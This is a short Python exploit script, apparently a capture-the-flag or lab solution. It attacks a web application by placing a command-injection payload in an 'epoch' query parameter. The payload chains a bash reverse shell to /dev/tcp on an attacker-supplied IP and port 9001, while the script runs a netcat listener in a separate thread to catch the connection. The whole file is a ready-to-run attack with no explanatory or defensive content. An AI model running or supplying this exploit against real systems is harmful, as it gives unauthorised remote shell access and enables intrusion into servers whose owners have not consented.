import requests
import sys
import os
import threading
from urllib.parse import quote

def exploit(s, url, ip):
    payload = f'1718025316&&bash -i >& /dev/tcp/{ip}/9001 0>&1&id'
    encoded_payload = quote(payload)
    exploit_url = f"{url}/?epoch={encoded_payload}"
    r = s.get(exploit_url, verify=False)

def run_nc():
    os.system("nc -lnvp 9001")

def main():
    if len(sys.argv) != 3:
        print("(!) Usage: %s <url>  <your ip>" % sys.argv[0])
        print("(!) Example: %s www.example.com  10.10.10.10 " % sys.argv[0])
        sys.exit(-1)

    s = requests.session()
    url = sys.argv[1]
    ip = sys.argv[2]
    # Run nc in a separate thread
    nc_thread = threading.Thread(target=run_nc)
    nc_thread.start()

    # Run the exploit function
    exploit(s, url, ip)

if __name__ == '__main__':
    main()